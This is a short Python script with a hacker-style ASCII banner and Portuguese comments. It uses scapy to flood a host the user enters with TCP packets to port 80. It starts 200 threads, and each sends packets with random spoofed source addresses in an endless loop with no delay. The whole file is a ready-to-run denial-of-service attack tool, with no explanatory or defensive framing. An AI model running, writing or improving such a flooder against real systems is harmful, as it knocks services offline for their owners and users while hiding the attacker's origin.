#!/usr/bin/python3

#Alterar a porta de a cordo com o destino

print ("          _     _ _         _                    _  ")
print ("         | |   (_) |       | |                  | | ")
print ("__      _| |__  _| |_ ___  | |__   ___  __ _  __| | ")
print ("\ \ /\ / / '_ \| | __/ _ \ | '_ \ / _ \/ _` |/ _` | ")
print (" \ V  V /| | | | | ||  __/ | | | |  __/ (_| | (_| | ")
print ("  \_/\_/ |_| |_|_|\__\___| |_| |_|\___|\__,_|\__,_| ")
print ("")
print ("$$ BY:Sym0SYm $$")
print ("")

from scapy.all import *
import threading

destino = input("Digite o host:  ")
print ("Flooding in :80")
def flood():
    pacote = IP(src=RandIP("*.*.*.*"), dst= destino) / TCP(dport=80)#porta de destino#
    send(pacote, loop=1, inter=0)
for x in range(200):
    threading.Thread(target=flood).start()
